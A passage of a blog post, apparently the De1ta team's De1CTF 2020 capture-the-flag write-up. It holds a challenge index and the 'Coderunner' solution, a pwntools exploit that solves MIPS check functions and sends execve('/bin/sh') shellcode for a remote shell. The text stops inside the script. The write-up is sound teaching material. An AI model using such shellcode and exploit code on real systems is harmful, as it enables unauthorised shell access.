<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="De1ta-Team">
    

    <!--Author-->
    
        <meta name="author" content="chybeta、pr0ph3t">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="De1CTF 2020 Writeup">
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="De1ta">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>De1CTF 2020 Writeup - De1ta</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
    


</head>


<body>

<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><img src="https://avatars0.githubusercontent.com/u/39492862"></a>
        
        <!-- hacked by chybeta -->
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2020/05/06/de1ctf2020 Writeup/">
                De1CTF 2020 Writeup
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2020-05-06</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1>
<a id="more"></a>
<blockquote>
<p>Team: De1ta</p>
</blockquote>
<p>前排广告位：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系<code>ZGUxdGFAcHJvdG9ubWFpbC5jb20=</code></p>
<h1><span id="source-exp-wp">source + exp + wp</span></h1>
<p><a href="https://github.com/De1ta-team/De1CTF2020" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2020</a></p>
<p><a href="https://github.com/De1ta-team/De1CTF2020/blob/master/wp_cn.pdf" target="_blank" rel="noopener">中文</a></p>
<!-- toc -->
<ul>
<li><a href="#pwn">pwn</a>
<ul>
<li><a href="#coderunner">Coderunner</a>
<ul>
<li><a href="#setup">setup</a></li>
<li><a href="#solution">Solution</a>
<ul>
<li><a href="#manual-analysis">Manual analysis</a></li>
<li><a href="#angr">Angr</a></li>
</ul></li>
</ul></li>
<li><a href="#broadcasttest">BroadCastTest</a></li>
<li><a href="#pppd">pppd</a></li>
<li><a href="#stl_container">stl_container</a></li>
<li><a href="#mc_realworld">mc_realworld</a></li>
</ul></li>
<li><a href="#crypto">crypto</a>
<ul>
<li><a href="#nlfsr">NLFSR</a></li>
<li><a href="#easyrsa">easyRSA</a></li>
<li><a href="#ecdh">ECDH</a></li>
<li><a href="#homomorphic">Homomorphic</a></li>
<li><a href="#mini-purε-plus">Mini Purε Plus</a></li>
<li><a href="#ov">OV</a></li>
<li><a href="#mc_noisemap">mc_noisemap</a></li>
</ul></li>
<li><a href="#web">web</a>
<ul>
<li><a href="#check-in">check in</a></li>
<li><a href="#animal-crossing">Animal crossing</a>
<ul>
<li><a href="#level-1-bypass-the-cloud-waf">Level 1: bypass the cloud WAF</a>
<ul>
<li><a href="#layer-1-blacklist-detection">Layer 1: Blacklist detection</a></li>
<li><a href="#layer-2-static-syntax-analysis">Layer 2: Static syntax analysis</a></li>
</ul></li>
<li><a href="#level-2-read-400-pictures">Level 2: read 400 pictures</a>
<ul>
<li><a href="#bypass-csp-to-import-html2canvas-lib">Bypass CSP to import html2canvas lib</a></li>
<li><a href="#read-image-and-execute">Read image and execute</a></li>
</ul></li>
</ul></li>
<li><a href="#calc">calc</a>
<ul>
<li><a href="#1-challenge-info">1. challenge info</a></li>
<li><a href="#2-design-document">2. design document</a></li>
<li><a href="#3-exp">3. exp</a></li>
<li><a href="#4-other-writeups">4. other writeups</a></li>
</ul></li>
<li><a href="#hard_pentest">Hard_Pentest</a></li>
<li><a href="#mixture">mixture</a></li>
<li><a href="#easy-php-uaf">Easy PHP UAF</a>
<ul>
<li><a href="#solution">solution</a></li>
<li><a href="#exp">exp</a></li>
</ul></li>
<li><a href="#mc_logclient">mc_logclient</a></li>
</ul></li>
<li><a href="#misc">misc</a>
<ul>
<li><a href="#mc_easybgm">mc_easybgm</a></li>
<li><a href="#mc_joinin">mc_joinin</a></li>
<li><a href="#mc_champion">mc_champion</a></li>
<li><a href="#life">Life</a>
<ul>
<li><a href="#hints">Hints</a></li>
<li><a href="#flag">Flag</a></li>
<li><a href="#solution-1">Solution</a></li>
<li><a href="#note">Note</a></li>
</ul></li>
<li><a href="#easy-protocol">Easy Protocol</a>
<ul>
<li><a href="#hint">hint</a></li>
<li><a href="#part1">part1</a></li>
<li><a href="#part2">part2</a></li>
<li><a href="#part3">part3</a></li>
</ul></li>
<li><a href="#misc_chowder">Misc_Chowder</a></li>
</ul></li>
<li><a href="#reverse">reverse</a>
<ul>
<li><a href="#parser">parser</a>
<ul>
<li><a href="#idea">Idea</a></li>
<li><a href="#reverse">Reverse</a></li>
<li><a href="#solver">Solver</a></li>
</ul></li>
<li><a href="#flw">Flw</a>
<ul>
<li><a href="#vm-instruction">VM instruction</a></li>
<li><a href="#algorithm-design">Algorithm design</a></li>
<li><a href="#exppy">exp.py</a></li>
</ul></li>
<li><a href="#little-elves">little elves</a></li>
<li><a href="#mc_ticktock">mc_ticktock</a></li>
</ul></li>
</ul>
<!-- tocstop -->
<h1><span id="pwn">pwn</span></h1>
<h2><span id="coderunner">Coderunner</span></h2>
<p>It is a chllenge about AEG &amp; mips-asm.</p>
<h3><span id="setup">setup</span></h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ./docker</span><br><span class="line">docker build -t pwn .</span><br><span class="line">docker run -d -p &quot;0.0.0.0:9999:9999&quot; --name=&quot;pwn&quot; pwn</span><br></pre></td></tr></table></figure>
<h3><span id="solution">Solution</span></h3>
<p>There are several types of check functions（6types * 16 rounds). I wish you guys would know mips-instruction more by reading mips-asm / analysising / imatating. But this challenge is harder than I expected. The check part wastes too much time and the timelimit is too strict. By the way, The file Time is able to write, and the context(which you can forge) will be updated to Rank. There are two types of exp for this challenge.</p>
<h4><span id="manual-analysis">Manual analysis</span></h4>
<p>fast but annoying</p>
<ol type="1">
<li>Get some binary</li>
<li>specific solution of each type of check function
<ol type="1">
<li>Get the Bytecode</li>
<li>Feature recognition</li>
<li>Parameter extraction</li>
</ol></li>
<li>shellcode</li>
</ol>
<p>This rough exp sometimes may work &lt;3. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'mips'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analys</span><span class="params">(name=<span class="string">'./1'</span>)</span>:</span></span><br><span class="line">    b=ELF(name)</span><br><span class="line">    entry=b.sym[<span class="string">'main'</span>]+(<span class="number">0xa8</span><span class="number">-0x1c</span>)</span><br><span class="line">    entry=entry<span class="number">-0x400000</span></span><br><span class="line">    tmp=open(<span class="string">"./1"</span>,<span class="string">"r"</span>)</span><br><span class="line">    check=u32(tmp.read()[entry:entry+<span class="number">3</span>]+<span class="string">'\0'</span>)&lt;&lt;<span class="number">2</span></span><br><span class="line">    check=check+(<span class="number">0xbc</span><span class="number">-0x28</span>)<span class="number">-0x400000</span></span><br><span class="line">    tmp.close()</span><br><span class="line">    tmp=open(<span class="string">"./1"</span>,<span class="string">'r'</span>)</span><br><span class="line">    END=(u32(tmp.read()[check:check+<span class="number">3</span>]+<span class="string">'\0'</span>)&lt;&lt;<span class="number">2</span>)<span class="number">-4</span></span><br><span class="line">    tmp.close()</span><br><span class="line">    <span class="comment"># now we get the END of check funcs</span></span><br><span class="line">    START=<span class="number">0x400bb0</span></span><br><span class="line">    f=open(name)</span><br><span class="line">    f.read(<span class="number">0xbb0</span>)</span><br><span class="line">    data=f.read(END-START)[<span class="number">44</span>:]</span><br><span class="line">    f.close()</span><br><span class="line">    tmp=data.split(<span class="string">"\x08\x00\xe0\x03\x00\x00\x00\x00"</span>)</span><br><span class="line">    <span class="keyword">assert</span>(len(tmp)==<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(s==<span class="string">'\x10'</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span><span class="comment">#&lt;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span><span class="comment">#&gt;=</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_1</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># asb(s[0]*s[0]-s[3]*s[3])?asb(s[1]*s[1]-s[2]*s[2])</span></span><br><span class="line">    <span class="comment"># asb(s[1]*s[1]-s[0]*s[0])?asb(s[2]*s[2]-s[3]*s[3])</span></span><br><span class="line">    s=s[<span class="number">24</span>:]</span><br><span class="line">    tmp=ord(s[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    idx_list=[tmp,(tmp+<span class="number">1</span>)%<span class="number">4</span>,(tmp+<span class="number">2</span>)%<span class="number">4</span>,(tmp+<span class="number">3</span>)%<span class="number">4</span>]</span><br><span class="line">    m1=judge(s[<span class="number">0xa8</span>+<span class="number">7</span>])</span><br><span class="line">    m2=judge(s[<span class="number">0x160</span>+<span class="number">7</span>])</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    tmp=[]</span></span><br><span class="line"><span class="string">    for x in range(4):</span></span><br><span class="line"><span class="string">        tmp.append(Int('x&#123;&#125;'.format(x)))</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    solver = Solver()</span></span><br><span class="line"><span class="string">    for x in range(4):</span></span><br><span class="line"><span class="string">        solver.add(tmp[x]&gt;=0,tmp[x]&lt;256)</span></span><br><span class="line"><span class="string">    if(m1):</span></span><br><span class="line"><span class="string">        solver.add((tmp[0]*tmp[0]-tmp[3]*tmp[3])*(tmp[0]*tmp[0]-tmp[3]*tmp[3])&lt;(tmp[1]*tmp[1]-tmp[2]*tmp[2])*(tmp[1]*tmp[1]-tmp[2]*tmp[2]))</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        solver.add((tmp[0]*tmp[0]-tmp[3]*tmp[3])*(tmp[0]*tmp[0]-tmp[3]*tmp[3])&gt;=(tmp[1]*tmp[1]-tmp[2]*tmp[2])*(tmp[1]*tmp[1]-tmp[2]*tmp[2]))</span></span><br><span class="line"><span class="string">    if(m2):</span></span><br><span class="line"><span class="string">        solver.add((tmp[1]*tmp[1]-tmp[0]*tmp[0])*(tmp[1]*tmp[1]-tmp[0]*tmp[0])&lt;(tmp[2]*tmp[2]-tmp[3]*tmp[3])*(tmp[2]*tmp[2]-tmp[3]*tmp[3]))</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        solver.add((tmp[1]*tmp[1]-tmp[0]*tmp[0])*(tmp[1]*tmp[1]-tmp[0]*tmp[0])&gt;=(tmp[2]*tmp[2]-tmp[3]*tmp[3])*(tmp[2]*tmp[2]-tmp[3]*tmp[3]))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if solver.check() == sat:</span></span><br><span class="line"><span class="string">        res=solver.model()</span></span><br><span class="line"><span class="string">        print res</span></span><br><span class="line"><span class="string">        print m1,m2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> m1==<span class="number">1</span> <span class="keyword">and</span> m2==<span class="number">1</span>:</span><br><span class="line">        res_list=[<span class="number">79</span>,<span class="number">192</span>,<span class="number">215</span>,<span class="number">18</span>]</span><br><span class="line">    <span class="keyword">elif</span> m1==<span class="number">1</span> <span class="keyword">and</span> m2==<span class="number">0</span>:</span><br><span class="line">        res_list=[<span class="number">93</span>,<span class="number">246</span>,<span class="number">240</span>,<span class="number">81</span>]</span><br><span class="line">    <span class="keyword">elif</span> m1==<span class="number">0</span> <span class="keyword">and</span> m2==<span class="number">1</span>:</span><br><span class="line">        res_list=[<span class="number">0</span>,<span class="number">88</span>,<span class="number">38</span>,<span class="number">80</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res_list=[<span class="number">227</span>,<span class="number">70</span>,<span class="number">35</span>,<span class="number">163</span>]</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    tmp.sort()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_2</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]+s[1] != ?</span></span><br><span class="line">    <span class="comment"># s[1]+s[2] != ?</span></span><br><span class="line">    <span class="comment"># s[2]+s[3] != ?</span></span><br><span class="line">    <span class="comment"># s[3]+s[0] != ?</span></span><br><span class="line">    <span class="keyword">return</span> p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_3</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]+s[1]+s[2]== ?</span></span><br><span class="line">    <span class="comment"># s[1]+s[2]+s[3]== ?</span></span><br><span class="line">    <span class="comment"># s[2]+s[3]+s[0]== ?</span></span><br><span class="line">    <span class="comment"># s[3]+s[0]+s[1]== ?</span></span><br><span class="line">    s=s[<span class="number">24</span>:<span class="number">24</span>+<span class="number">0xdc</span>]</span><br><span class="line">    s=s.split(<span class="string">"\0"</span>+<span class="string">'\x62\x14'</span>)</span><br><span class="line">    s.pop()</span><br><span class="line">    idx_list=[((x+ord(s[<span class="number">0</span>][<span class="number">0</span>]))<span class="number">-1</span>)%<span class="number">4</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    res_list=[]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        res_list.append(u16(s[_][<span class="number">-5</span>:<span class="number">-3</span>]))</span><br><span class="line">    sig=sum(res_list)/<span class="number">3</span></span><br><span class="line">    tmp_list=[]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        tmp_list.append(sig-res_list[_])</span><br><span class="line">    tmp=zip(idx_list,tmp_list)</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    tmp.sort()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        res+=chr(tmp[_][<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_4</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0] == ?</span></span><br><span class="line">    <span class="comment"># s[1] == ?</span></span><br><span class="line">    <span class="comment"># s[2] == s[0] * s[0]</span></span><br><span class="line">    <span class="comment"># s[3] == s[1]*s[1]+s[2]*s[2]-s[0]*s[0]</span></span><br><span class="line">    s=s[<span class="number">24</span>:]</span><br><span class="line">    <span class="keyword">if</span>(ord(s[<span class="number">0</span>])==<span class="number">0</span>):</span><br><span class="line">        idx_list=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        idx_list=[]</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            idx_list.append((ord(s[<span class="number">0</span>])+_)%<span class="number">4</span>)</span><br><span class="line">    res_list=[]</span><br><span class="line">    tmp=s.find(<span class="string">'\x00\x02\x24'</span>)</span><br><span class="line">    res_list.append(ord(s[tmp<span class="number">-1</span>]))</span><br><span class="line">    res_list.append(ord(s[s.find(<span class="string">'\x00\x02\x24'</span>,tmp+<span class="number">1</span>)<span class="number">-1</span>]))</span><br><span class="line">    res_list.append((res_list[<span class="number">0</span>]*res_list[<span class="number">0</span>])%<span class="number">256</span>)</span><br><span class="line">    res_list.append(((res_list[<span class="number">1</span>]*res_list[<span class="number">1</span>])+(res_list[<span class="number">2</span>]*res_list[<span class="number">2</span>])-(res_list[<span class="number">0</span>]*res_list[<span class="number">0</span>]))%<span class="number">256</span>)</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    tmp.sort()</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]^s[1] == ?</span></span><br><span class="line">    <span class="comment"># s[1] == ?</span></span><br><span class="line">    <span class="comment"># s[2] == ((s[0]^s[1]&amp;0x7f)*2)%256</span></span><br><span class="line">    <span class="comment"># s[3] == s[0]^s[1]^s[2]</span></span><br><span class="line">    s=s[<span class="number">24</span>:<span class="number">24</span>+<span class="number">172</span>]</span><br><span class="line">    s=s.split(<span class="string">'\x00\x62\x14'</span>)</span><br><span class="line">    res_list=[]</span><br><span class="line">    tmp=ord(s[<span class="number">1</span>][<span class="number">-5</span>])</span><br><span class="line">    res_list.append(ord(s[<span class="number">0</span>][<span class="number">-5</span>])^tmp)</span><br><span class="line">    res_list.append(tmp)</span><br><span class="line">    res_list.append((((res_list[<span class="number">0</span>]^res_list[<span class="number">1</span>])&amp;<span class="number">0x7f</span>)*<span class="number">2</span>)%<span class="number">256</span>)</span><br><span class="line">    res_list.append(res_list[<span class="number">0</span>]^res_list[<span class="number">1</span>]^res_list[<span class="number">2</span>])</span><br><span class="line">    idx_list=[(x+ord(s[<span class="number">0</span>][<span class="number">0</span>]))%<span class="number">4</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    tmp.sort()</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(x[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">type_6</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># s[0]=s[2]</span></span><br><span class="line">    <span class="comment"># s[3]=s[1]</span></span><br><span class="line">    <span class="comment"># s[3]= ?</span></span><br><span class="line">    <span class="comment"># s[2]= ?</span></span><br><span class="line">    s=s[<span class="number">24</span>:<span class="number">24</span>+<span class="number">0x64</span>]</span><br><span class="line">    s=s.split(<span class="string">'\x00\x62\x14'</span>)</span><br><span class="line">    s.pop()</span><br><span class="line">    tmp=ord(s[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    idx_list=[tmp,(tmp+<span class="number">2</span>)%<span class="number">4</span>,(tmp+<span class="number">3</span>)%<span class="number">4</span>,(tmp+<span class="number">1</span>)%<span class="number">4</span>]</span><br><span class="line">    res_list=[]</span><br><span class="line">    res_list.append(ord(s[<span class="number">3</span>][<span class="number">-5</span>]))</span><br><span class="line">    res_list.append(ord(s[<span class="number">3</span>][<span class="number">-5</span>]))</span><br><span class="line">    res_list.append(ord(s[<span class="number">2</span>][<span class="number">-5</span>]))</span><br><span class="line">    res_list.append(ord(s[<span class="number">2</span>][<span class="number">-5</span>]))</span><br><span class="line">    tmp=zip(idx_list,res_list)</span><br><span class="line">    tmp.sort()</span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> tmp:</span><br><span class="line">        res+=chr(_[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(data)</span>:</span></span><br><span class="line">    p.readuntil(<span class="string">"Faster &gt; \n"</span>)</span><br><span class="line">    p.send(data.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    p.readuntil(<span class="string">"Name\n&gt; "</span>)</span><br><span class="line">    p.send(<span class="string">"niernier"</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    p.readuntil(<span class="string">"&gt; \n"</span>)</span><br><span class="line">    sh=<span class="string">'''</span></span><br><span class="line"><span class="string">    li $a0,0x6e69622f</span></span><br><span class="line"><span class="string">    sw $a0,0($sp)</span></span><br><span class="line"><span class="string">    li $a0,0x68732f</span></span><br><span class="line"><span class="string">    sw $a0,4($sp)</span></span><br><span class="line"><span class="string">    move $a0,$sp</span></span><br><span class="line"><span class="string">    li $v0,4011</span></span><br><span class="line"><span class="string">    li $a1,0</span></span><br><span class="line"><span class="string">    li $a2,0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(len(asm(sh)))</span><br><span class="line">    p.send(asm(sh))</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_pow</span><span class="params">()</span>:</span></span><br><span class="line">    p.readuntil(<span class="string">'hashlib.sha256(s).hexdigest() == "'</span>)</span><br><span class="line">    res=p.read(<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span 